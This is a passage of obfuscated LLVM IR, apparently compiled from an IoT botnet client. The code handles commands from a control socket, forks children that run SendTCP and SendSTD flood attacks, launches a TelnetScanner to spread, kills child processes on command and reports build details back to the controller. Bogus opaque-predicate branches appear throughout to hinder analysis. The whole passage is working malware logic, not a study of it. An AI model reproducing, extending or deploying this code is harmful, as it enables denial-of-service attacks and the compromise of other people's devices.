  %964 = getelementptr inbounds i8*, i8** %963, i64 4
  %965 = load i8*, i8** %964, align 8
  store i8* %965, i8** %26, align 8
  %966 = load i32, i32* %3, align 4
  %967 = icmp eq i32 %966, 7
  %968 = load i32, i32* @x.89
  %969 = load i32, i32* @y.90
  %970 = sub i32 %968, 1
  %971 = mul i32 %968, %970
  %972 = urem i32 %971, 2
  %973 = icmp eq i32 %972, 0
  %974 = icmp slt i32 %969, 10
  %975 = or i1 %973, %974
  br i1 %975, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %967, label %976, label %981

; <label>:976:                                    ; preds = %originalBBpart2120
  %977 = load i8**, i8*** %4, align 8
  %978 = getelementptr inbounds i8*, i8** %977, i64 6
  %979 = load i8*, i8** %978, align 8
  %980 = call i32 @atoi(i8* %979) #9
  br label %982

; <label>:981:                                    ; preds = %originalBBpart2120
  br label %982

; <label>:982:                                    ; preds = %981, %976
  %983 = phi i32 [ %980, %976 ], [ 10, %981 ]
  store i32 %983, i32* %27, align 4
  %984 = load i32, i32* %3, align 4
  %985 = icmp sgt i32 %984, 5
  br i1 %985, label %986, label %1007

; <label>:986:                                    ; preds = %982
  %987 = load i32, i32* @x.89
  %988 = load i32, i32* @y.90
  %989 = sub i32 %987, 1
  %990 = mul i32 %987, %989
  %991 = urem i32 %990, 2
  %992 = icmp eq i32 %991, 0
  %993 = icmp slt i32 %988, 10
  %994 = or i1 %992, %993
  br i1 %994, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %986
  %995 = load i8**, i8*** %4, align 8
  %996 = getelementptr inbounds i8*, i8** %995, i64 5
  %997 = load i8*, i8** %996, align 8
  %998 = call i32 @atoi(i8* %997) #9
  %999 = load i32, i32* @x.89
  %1000 = load i32, i32* @y.90
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1008

; <label>:1007:                                   ; preds = %982
  br label %1008

; <label>:1008:                                   ; preds = %1007, %originalBBpart2124
  %1009 = phi i32 [ %998, %originalBBpart2124 ], [ 0, %1007 ]
  %1010 = load i32, i32* @x.89
  %1011 = load i32, i32* @y.90
  %1012 = sub i32 %1010, 1
  %1013 = mul i32 %1010, %1012
  %1014 = urem i32 %1013, 2
  %1015 = icmp eq i32 %1014, 0
  %1016 = icmp slt i32 %1011, 10
  %1017 = or i1 %1015, %1016
  br i1 %1017, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1008
  store i32 %1009, i32* %28, align 4
  store i32 32, i32* %29, align 4
  %1018 = load i8*, i8** %23, align 8
  %1019 = call i8* @strstr(i8* %1018, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %1020 = icmp ne i8* %1019, null
  %1021 = load i32, i32* @x.89
  %1022 = load i32, i32* @y.90
  %1023 = sub i32 %1021, 1
  %1024 = mul i32 %1021, %1023
  %1025 = urem i32 %1024, 2
  %1026 = icmp eq i32 %1025, 0
  %1027 = icmp slt i32 %1022, 10
  %1028 = or i1 %1026, %1027
  br i1 %1028, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %1020, label %1029, label %1097

; <label>:1029:                                   ; preds = %originalBBpart2128
  %1030 = load i8*, i8** %23, align 8
  %1031 = call i8* @strtok(i8* %1030, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1031, i8** %30, align 8
  br label %1032

; <label>:1032:                                   ; preds = %originalBBpart2140, %1029
  %1033 = load i32, i32* @x.89
  %1034 = load i32, i32* @y.90
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1032
  %1041 = load i8*, i8** %30, align 8
  %1042 = icmp ne i8* %1041, null
  %1043 = load i32, i32* @x.89
  %1044 = load i32, i32* @y.90
  %1045 = sub i32 %1043, 1
  %1046 = mul i32 %1043, %1045
  %1047 = urem i32 %1046, 2
  %1048 = icmp eq i32 %1047, 0
  %1049 = icmp slt i32 %1044, 10
  %1050 = or i1 %1048, %1049
  br i1 %1050, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1042, label %1051, label %1096

; <label>:1051:                                   ; preds = %originalBBpart2132
  %1052 = call i32 @listFork()
  %1053 = icmp ne i32 %1052, 0
  br i1 %1053, label %1078, label %1054

; <label>:1054:                                   ; preds = %1051
  %1055 = load i32, i32* @x.89
  %1056 = load i32, i32* @y.90
  %1057 = sub i32 %1055, 1
  %1058 = mul i32 %1055, %1057
  %1059 = urem i32 %1058, 2
  %1060 = icmp eq i32 %1059, 0
  %1061 = icmp slt i32 %1056, 10
  %1062 = or i1 %1060, %1061
  br i1 %1062, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1054
  %1063 = load i8*, i8** %30, align 8
  %1064 = load i32, i32* %24, align 4
  %1065 = load i32, i32* %25, align 4
  %1066 = load i8*, i8** %26, align 8
  %1067 = load i32, i32* %28, align 4
  %1068 = load i32, i32* %27, align 4
  %1069 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %1063, i32 %1064, i32 %1065, i8* %1066, i32 %1067, i32 %1068, i32 %1069)
  call void @_exit(i32 0) #11
  %1070 = load i32, i32* @x.89
  %1071 = load i32, i32* @y.90
  %1072 = sub i32 %1070, 1
  %1073 = mul i32 %1070, %1072
  %1074 = urem i32 %1073, 2
  %1075 = icmp eq i32 %1074, 0
  %1076 = icmp slt i32 %1071, 10
  %1077 = or i1 %1075, %1076
  br i1 %1077, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  unreachable

; <label>:1078:                                   ; preds = %1051
  %1079 = load i32, i32* @x.89
  %1080 = load i32, i32* @y.90
  %1081 = sub i32 %1079, 1
  %1082 = mul i32 %1079, %1081
  %1083 = urem i32 %1082, 2
  %1084 = icmp eq i32 %1083, 0
  %1085 = icmp slt i32 %1080, 10
  %1086 = or i1 %1084, %1085
  br i1 %1086, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1078
  %1087 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1087, i8** %30, align 8
  %1088 = load i32, i32* @x.89
  %1089 = load i32, i32* @y.90
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1032

; <label>:1096:                                   ; preds = %originalBBpart2132
  br label %1125

; <label>:1097:                                   ; preds = %originalBBpart2128
  %1098 = call i32 @listFork()
  %1099 = icmp ne i32 %1098, 0
  br i1 %1099, label %1100, label %1117

; <label>:1100:                                   ; preds = %1097
  %1101 = load i32, i32* @x.89
  %1102 = load i32, i32* @y.90
  %1103 = sub i32 %1101, 1
  %1104 = mul i32 %1101, %1103
  %1105 = urem i32 %1104, 2
  %1106 = icmp eq i32 %1105, 0
  %1107 = icmp slt i32 %1102, 10
  %1108 = or i1 %1106, %1107
  br i1 %1108, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1100
  %1109 = load i32, i32* @x.89
  %1110 = load i32, i32* @y.90
  %1111 = sub i32 %1109, 1
  %1112 = mul i32 %1109, %1111
  %1113 = urem i32 %1112, 2
  %1114 = icmp eq i32 %1113, 0
  %1115 = icmp slt i32 %1110, 10
  %1116 = or i1 %1114, %1115
  br i1 %1116, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %1433

; <label>:1117:                                   ; preds = %1097
  %1118 = load i8*, i8** %23, align 8
  %1119 = load i32, i32* %24, align 4
  %1120 = load i32, i32* %25, align 4
  %1121 = load i8*, i8** %26, align 8
  %1122 = load i32, i32* %28, align 4
  %1123 = load i32, i32* %27, align 4
  %1124 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %1118, i32 %1119, i32 %1120, i8* %1121, i32 %1122, i32 %1123, i32 %1124)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1125:                                   ; preds = %1096
  br label %1126

; <label>:1126:                                   ; preds = %1125, %855
  %1127 = load i8**, i8*** %4, align 8
  %1128 = getelementptr inbounds i8*, i8** %1127, i64 0
  %1129 = load i8*, i8** %1128, align 8
  %1130 = call i32 @strcmp(i8* %1129, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.193, i32 0, i32 0)) #9
  %1131 = icmp ne i32 %1130, 0
  br i1 %1131, label %1316, label %1132

; <label>:1132:                                   ; preds = %1126
  %1133 = load i32, i32* @x.89
  %1134 = load i32, i32* @y.90
  %1135 = sub i32 %1133, 1
  %1136 = mul i32 %1133, %1135
  %1137 = urem i32 %1136, 2
  %1138 = icmp eq i32 %1137, 0
  %1139 = icmp slt i32 %1134, 10
  %1140 = or i1 %1138, %1139
  br i1 %1140, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1132
  %1141 = load i32, i32* %3, align 4
  %1142 = icmp slt i32 %1141, 4
  %1143 = load i32, i32* @x.89
  %1144 = load i32, i32* @y.90
  %1145 = sub i32 %1143, 1
  %1146 = mul i32 %1143, %1145
  %1147 = urem i32 %1146, 2
  %1148 = icmp eq i32 %1147, 0
  %1149 = icmp slt i32 %1144, 10
  %1150 = or i1 %1148, %1149
  br i1 %1150, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1142, label %1163, label %1151

; <label>:1151:                                   ; preds = %originalBBpart2148
  %1152 = load i8**, i8*** %4, align 8
  %1153 = getelementptr inbounds i8*, i8** %1152, i64 2
  %1154 = load i8*, i8** %1153, align 8
  %1155 = call i32 @atoi(i8* %1154) #9
  %1156 = icmp slt i32 %1155, 1
  br i1 %1156, label %1163, label %1157

; <label>:1157:                                   ; preds = %1151
  %1158 = load i8**, i8*** %4, align 8
  %1159 = getelementptr inbounds i8*, i8** %1158, i64 3
  %1160 = load i8*, i8** %1159, align 8
  %1161 = call i32 @atoi(i8* %1160) #9
  %1162 = icmp slt i32 %1161, 1
  br i1 %1162, label %1163, label %1164

; <label>:1163:                                   ; preds = %1157, %1151, %originalBBpart2148
  br label %1433

; <label>:1164:                                   ; preds = %1157
  %1165 = load i32, i32* @x.89
  %1166 = load i32, i32* @y.90
  %1167 = sub i32 %1165, 1
  %1168 = mul i32 %1165, %1167
  %1169 = urem i32 %1168, 2
  %1170 = icmp eq i32 %1169, 0
  %1171 = icmp slt i32 %1166, 10
  %1172 = or i1 %1170, %1171
  br i1 %1172, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1164
  %1173 = load i8**, i8*** %4, align 8
  %1174 = getelementptr inbounds i8*, i8** %1173, i64 1
  %1175 = load i8*, i8** %1174, align 8
  store i8* %1175, i8** %31, align 8
  %1176 = load i8**, i8*** %4, align 8
  %1177 = getelementptr inbounds i8*, i8** %1176, i64 2
  %1178 = load i8*, i8** %1177, align 8
  %1179 = call i32 @atoi(i8* %1178) #9
  store i32 %1179, i32* %32, align 4
  %1180 = load i8**, i8*** %4, align 8
  %1181 = getelementptr inbounds i8*, i8** %1180, i64 3
  %1182 = load i8*, i8** %1181, align 8
  %1183 = call i32 @atoi(i8* %1182) #9
  store i32 %1183, i32* %33, align 4
  %1184 = load i8*, i8** %31, align 8
  %1185 = call i8* @strstr(i8* %1184, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %1186 = icmp ne i8* %1185, null
  %1187 = load i32, i32* @x.89
  %1188 = load i32, i32* @y.90
  %1189 = sub i32 %1187, 1
  %1190 = mul i32 %1187, %1189
  %1191 = urem i32 %1190, 2
  %1192 = icmp eq i32 %1191, 0
  %1193 = icmp slt i32 %1188, 10
  %1194 = or i1 %1192, %1193
  br i1 %1194, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %1186, label %1195, label %1291

; <label>:1195:                                   ; preds = %originalBBpart2152
  %1196 = load i32, i32* @x.89
  %1197 = load i32, i32* @y.90
  %1198 = sub i32 %1196, 1
  %1199 = mul i32 %1196, %1198
  %1200 = urem i32 %1199, 2
  %1201 = icmp eq i32 %1200, 0
  %1202 = icmp slt i32 %1197, 10
  %1203 = or i1 %1201, %1202
  br i1 %1203, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1195
  %1204 = load i8*, i8** %31, align 8
  %1205 = call i8* @strtok(i8* %1204, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1205, i8** %34, align 8
  %1206 = load i32, i32* @x.89
  %1207 = load i32, i32* @y.90
  %1208 = sub i32 %1206, 1
  %1209 = mul i32 %1206, %1208
  %1210 = urem i32 %1209, 2
  %1211 = icmp eq i32 %1210, 0
  %1212 = icmp slt i32 %1207, 10
  %1213 = or i1 %1211, %1212
  br i1 %1213, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1214

; <label>:1214:                                   ; preds = %originalBBpart2168, %originalBBpart2156
  %1215 = load i32, i32* @x.89
  %1216 = load i32, i32* @y.90
  %1217 = sub i32 %1215, 1
  %1218 = mul i32 %1215, %1217
  %1219 = urem i32 %1218, 2
  %1220 = icmp eq i32 %1219, 0
  %1221 = icmp slt i32 %1216, 10
  %1222 = or i1 %1220, %1221
  br i1 %1222, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1214
  %1223 = load i8*, i8** %34, align 8
  %1224 = icmp ne i8* %1223, null
  %1225 = load i32, i32* @x.89
  %1226 = load i32, i32* @y.90
  %1227 = sub i32 %1225, 1
  %1228 = mul i32 %1225, %1227
  %1229 = urem i32 %1228, 2
  %1230 = icmp eq i32 %1229, 0
  %1231 = icmp slt i32 %1226, 10
  %1232 = or i1 %1230, %1231
  br i1 %1232, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br i1 %1224, label %1233, label %1274

; <label>:1233:                                   ; preds = %originalBBpart2160
  %1234 = call i32 @listFork()
  %1235 = icmp ne i32 %1234, 0
  br i1 %1235, label %1256, label %1236

; <label>:1236:                                   ; preds = %1233
  %1237 = load i32, i32* @x.89
  %1238 = load i32, i32* @y.90
  %1239 = sub i32 %1237, 1
  %1240 = mul i32 %1237, %1239
  %1241 = urem i32 %1240, 2
  %1242 = icmp eq i32 %1241, 0
  %1243 = icmp slt i32 %1238, 10
  %1244 = or i1 %1242, %1243
  br i1 %1244, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1236
  %1245 = load i8*, i8** %34, align 8
  %1246 = load i32, i32* %32, align 4
  %1247 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %1245, i32 %1246, i32 %1247)
  call void @_exit(i32 0) #11
  %1248 = load i32, i32* @x.89
  %1249 = load i32, i32* @y.90
  %1250 = sub i32 %1248, 1
  %1251 = mul i32 %1248, %1250
  %1252 = urem i32 %1251, 2
  %1253 = icmp eq i32 %1252, 0
  %1254 = icmp slt i32 %1249, 10
  %1255 = or i1 %1253, %1254
  br i1 %1255, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  unreachable

; <label>:1256:                                   ; preds = %1233
  %1257 = load i32, i32* @x.89
  %1258 = load i32, i32* @y.90
  %1259 = sub i32 %1257, 1
  %1260 = mul i32 %1257, %1259
  %1261 = urem i32 %1260, 2
  %1262 = icmp eq i32 %1261, 0
  %1263 = icmp slt i32 %1258, 10
  %1264 = or i1 %1262, %1263
  br i1 %1264, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1256
  %1265 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %1265, i8** %34, align 8
  %1266 = load i32, i32* @x.89
  %1267 = load i32, i32* @y.90
  %1268 = sub i32 %1266, 1
  %1269 = mul i32 %1266, %1268
  %1270 = urem i32 %1269, 2
  %1271 = icmp eq i32 %1270, 0
  %1272 = icmp slt i32 %1267, 10
  %1273 = or i1 %1271, %1272
  br i1 %1273, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1214

; <label>:1274:                                   ; preds = %originalBBpart2160
  %1275 = load i32, i32* @x.89
  %1276 = load i32, i32* @y.90
  %1277 = sub i32 %1275, 1
  %1278 = mul i32 %1275, %1277
  %1279 = urem i32 %1278, 2
  %1280 = icmp eq i32 %1279, 0
  %1281 = icmp slt i32 %1276, 10
  %1282 = or i1 %1280, %1281
  br i1 %1282, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1274
  %1283 = load i32, i32* @x.89
  %1284 = load i32, i32* @y.90
  %1285 = sub i32 %1283, 1
  %1286 = mul i32 %1283, %1285
  %1287 = urem i32 %1286, 2
  %1288 = icmp eq i32 %1287, 0
  %1289 = icmp slt i32 %1284, 10
  %1290 = or i1 %1288, %1289
  br i1 %1290, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1299

; <label>:1291:                                   ; preds = %originalBBpart2152
  %1292 = call i32 @listFork()
  %1293 = icmp ne i32 %1292, 0
  br i1 %1293, label %1294, label %1295

; <label>:1294:                                   ; preds = %1291
  br label %1433

; <label>:1295:                                   ; preds = %1291
  %1296 = load i8*, i8** %31, align 8
  %1297 = load i32, i32* %32, align 4
  %1298 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %1296, i32 %1297, i32 %1298)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1299:                                   ; preds = %originalBBpart2172
  %1300 = load i32, i32* @x.89
  %1301 = load i32, i32* @y.90
  %1302 = sub i32 %1300, 1
  %1303 = mul i32 %1300, %1302
  %1304 = urem i32 %1303, 2
  %1305 = icmp eq i32 %1304, 0
  %1306 = icmp slt i32 %1301, 10
  %1307 = or i1 %1305, %1306
  br i1 %1307, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1299
  %1308 = load i32, i32* @x.89
  %1309 = load i32, i32* @y.90
  %1310 = sub i32 %1308, 1
  %1311 = mul i32 %1308, %1310
  %1312 = urem i32 %1311, 2
  %1313 = icmp eq i32 %1312, 0
  %1314 = icmp slt i32 %1309, 10
  %1315 = or i1 %1313, %1314
  br i1 %1315, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1316

; <label>:1316:                                   ; preds = %originalBBpart2176, %1126
  %1317 = load i8**, i8*** %4, align 8
  %1318 = getelementptr inbounds i8*, i8** %1317, i64 0
  %1319 = load i8*, i8** %1318, align 8
  %1320 = call i32 @strcmp(i8* %1319, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i32 0, i32 0)) #9
  %1321 = icmp ne i32 %1320, 0
  br i1 %1321, label %1422, label %1322

; <label>:1322:                                   ; preds = %1316
  store i32 0, i32* %35, align 4
  store i64 0, i64* %36, align 8
  br label %1323

; <label>:1323:                                   ; preds = %originalBBpart2205, %1322
  %1324 = load i32, i32* @x.89
  %1325 = load i32, i32* @y.90
  %1326 = sub i32 %1324, 1
  %1327 = mul i32 %1324, %1326
  %1328 = urem i32 %1327, 2
  %1329 = icmp eq i32 %1328, 0
  %1330 = icmp slt i32 %1325, 10
  %1331 = or i1 %1329, %1330
  br i1 %1331, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1323
  %1332 = load i64, i64* %36, align 8
  %1333 = load i64, i64* @numpids, align 8
  %1334 = icmp ult i64 %1332, %1333
  %1335 = load i32, i32* @x.89
  %1336 = load i32, i32* @y.90
  %1337 = sub i32 %1335, 1
  %1338 = mul i32 %1335, %1337
  %1339 = urem i32 %1338, 2
  %1340 = icmp eq i32 %1339, 0
  %1341 = icmp slt i32 %1336, 10
  %1342 = or i1 %1340, %1341
  br i1 %1342, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br i1 %1334, label %1343, label %1400

; <label>:1343:                                   ; preds = %originalBBpart2180
  %1344 = load i32*, i32** @pids, align 8
  %1345 = load i64, i64* %36, align 8
  %1346 = getelementptr inbounds i32, i32* %1344, i64 %1345
  %1347 = load i32, i32* %1346, align 4
  %1348 = icmp ne i32 %1347, 0
  br i1 %1348, label %1349, label %1380

; <label>:1349:                                   ; preds = %1343
  %1350 = load i32*, i32** @pids, align 8
  %1351 = load i64, i64* %36, align 8
  %1352 = getelementptr inbounds i32, i32* %1350, i64 %1351
  %1353 = load i32, i32* %1352, align 4
  %1354 = call i32 @getpid() #5
  %1355 = icmp ne i32 %1353, %1354
  br i1 %1355, label %1356, label %1380

; <label>:1356:                                   ; preds = %1349
  %1357 = load i32, i32* @x.89
  %1358 = load i32, i32* @y.90
  %1359 = sub i32 %1357, 1
  %1360 = mul i32 %1357, %1359
  %1361 = urem i32 %1360, 2
  %1362 = icmp eq i32 %1361, 0
  %1363 = icmp slt i32 %1358, 10
  %1364 = or i1 %1362, %1363
  br i1 %1364, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1356
  %1365 = load i32*, i32** @pids, align 8
  %1366 = load i64, i64* %36, align 8
  %1367 = getelementptr inbounds i32, i32* %1365, i64 %1366
  %1368 = load i32, i32* %1367, align 4
  %1369 = call i32 @kill(i32 %1368, i32 9) #5
  %1370 = load i32, i32* %35, align 4
  %1371 = add nsw i32 %1370, 1
  store i32 %1371, i32* %35, align 4
  %1372 = load i32, i32* @x.89
  %1373 = load i32, i32* @y.90
  %1374 = sub i32 %1372, 1
  %1375 = mul i32 %1372, %1374
  %1376 = urem i32 %1375, 2
  %1377 = icmp eq i32 %1376, 0
  %1378 = icmp slt i32 %1373, 10
  %1379 = or i1 %1377, %1378
  br i1 %1379, label %originalBBpart2196, label %originalBB182alteredBB

originalBBpart2196:                               ; preds = %originalBB182
  br label %1380

; <label>:1380:                                   ; preds = %originalBBpart2196, %1349, %1343
  br label %1381

; <label>:1381:                                   ; preds = %1380
  %1382 = load i32, i32* @x.89
  %1383 = load i32, i32* @y.90
  %1384 = sub i32 %1382, 1
  %1385 = mul i32 %1382, %1384
  %1386 = urem i32 %1385, 2
  %1387 = icmp eq i32 %1386, 0
  %1388 = icmp slt i32 %1383, 10
  %1389 = or i1 %1387, %1388
  br i1 %1389, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1381
  %1390 = load i64, i64* %36, align 8
  %1391 = add i64 %1390, 1
  store i64 %1391, i64* %36, align 8
  %1392 = load i32, i32* @x.89
  %1393 = load i32, i32* @y.90
  %1394 = sub i32 %1392, 1
  %1395 = mul i32 %1392, %1394
  %1396 = urem i32 %1395, 2
  %1397 = icmp eq i32 %1396, 0
  %1398 = icmp slt i32 %1393, 10
  %1399 = or i1 %1397, %1398
  br i1 %1399, label %originalBBpart2205, label %originalBB198alteredBB

originalBBpart2205:                               ; preds = %originalBB198
  br label %1323

; <label>:1400:                                   ; preds = %originalBBpart2180
  %1401 = load i32, i32* %35, align 4
  %1402 = icmp sgt i32 %1401, 0
  br i1 %1402, label %1403, label %1420

; <label>:1403:                                   ; preds = %1400
  %1404 = load i32, i32* @x.89
  %1405 = load i32, i32* @y.90
  %1406 = sub i32 %1404, 1
  %1407 = mul i32 %1404, %1406
  %1408 = urem i32 %1407, 2
  %1409 = icmp eq i32 %1408, 0
  %1410 = icmp slt i32 %1405, 10
  %1411 = or i1 %1409, %1410
  br i1 %1411, label %originalBB207, label %originalBB207alteredBB

originalBB207:                                    ; preds = %originalBB207alteredBB, %1403
  %1412 = load i32, i32* @x.89
  %1413 = load i32, i32* @y.90
  %1414 = sub i32 %1412, 1
  %1415 = mul i32 %1412, %1414
  %1416 = urem i32 %1415, 2
  %1417 = icmp eq i32 %1416, 0
  %1418 = icmp slt i32 %1413, 10
  %1419 = or i1 %1417, %1418
  br i1 %1419, label %originalBBpart2209, label %originalBB207alteredBB

originalBBpart2209:                               ; preds = %originalBB207
  br label %1421

; <label>:1420:                                   ; preds = %1400
  br label %1421

; <label>:1421:                                   ; preds = %1420, %originalBBpart2209
  br label %1422

; <label>:1422:                                   ; preds = %1421, %1316
  %1423 = load i8**, i8*** %4, align 8
  %1424 = getelementptr inbounds i8*, i8** %1423, i64 0
  %1425 = load i8*, i8** %1424, align 8
  %1426 = call i32 @strcmp(i8* %1425, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.195, i32 0, i32 0)) #9
  %1427 = icmp ne i32 %1426, 0
  br i1 %1427, label %1433, label %1428

; <label>:1428:                                   ; preds = %1422
  call void @CleanDevice()
  %1429 = load i32, i32* @mainCommSock, align 4
  %1430 = call i8* @getBuild()
  %1431 = call i32 @getEndianness()
  %1432 = call i32 (i32, i8*, ...) @sockprintf(i32 %1429, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.196, i32 0, i32 0), i8* %1430, i32 %1431)
  br label %1433

; <label>:1433:                                   ; preds = %1428, %1422, %1294, %1163, %originalBBpart2144, %originalBBpart2116, %originalBBpart2104, %762, %658, %originalBBpart272, %532, %originalBBpart264, %403, %originalBBpart244, %322, %318, %originalBBpart232, %189, %138, %117, %42
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %49
  %1434 = load i8**, i8*** %4, align 8
  %1435 = getelementptr inbounds i8*, i8** %1434, i64 1
  %1436 = load i8*, i8** %1435, align 8
  %1437 = call i32 @strcmp(i8* %1436, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.183, i32 0, i32 0)) #9
  %1438 = icmp ne i32 %1437, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  %1439 = load i32, i32* %7, align 4
  %1440 = icmp sge i32 %1439, 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %98
  %1441 = load i32, i32* %5, align 4
  %1442 = icmp ugt i32 %1441, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %119
  %1443 = load i32, i32* %5, align 4
  %1444 = icmp eq i32 %1443, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %139
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %190
  %1445 = load i32, i32* @scanPid, align 4
  %1446 = call i32 @kill(i32 %1445, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %209
  %1447 = load i8**, i8*** %4, align 8
  %1448 = getelementptr inbounds i8*, i8** %1447, i64 1
  %1449 = load i8*, i8** %1448, align 8
  %1450 = call i32 @strcmp(i8* %1449, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.185, i32 0, i32 0)) #9
  %1451 = icmp ne i32 %1450, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %242
  %1452 = load i32, i32* @mainCommSock, align 4
  %1453 = call i32 (i32, i8*, ...) @sockprintf(i32 %1452, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.186, i32 0, i32 0))
  %1454 = load i32, i32* %10, align 4
  %1455 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %1454, i32 %1455)
  call void @_exit(i32 0) #11
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %263
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %281
  %1456 = load i8**, i8*** %4, align 8
  %1457 = getelementptr inbounds i8*, i8** %1456, i64 0
  %1458 = load i8*, i8** %1457, align 8
  %1459 = call i32 @strcmp(i8* %1458, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.187, i32 0, i32 0)) #9
  %1460 = icmp ne i32 %1459, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %361
  %1461 = load i8**, i8*** %4, align 8
  %1462 = getelementptr inbounds i8*, i8** %1461, i64 5
  %1463 = load i8*, i8** %1462, align 8
  %1464 = call i32 @atoi(i8* %1463) #9
  %1465 = icmp slt i32 %1464, 1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %383
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %404
  %1466 = load i8**, i8*** %4, align 8
  %1467 = getelementptr inbounds i8*, i8** %1466, i64 1
  %1468 = load i8*, i8** %1467, align 8
  %1469 = load i8**, i8*** %4, align 8
  %1470 = getelementptr inbounds i8*, i8** %1469, i64 2
  %1471 = load i8*, i8** %1470, align 8
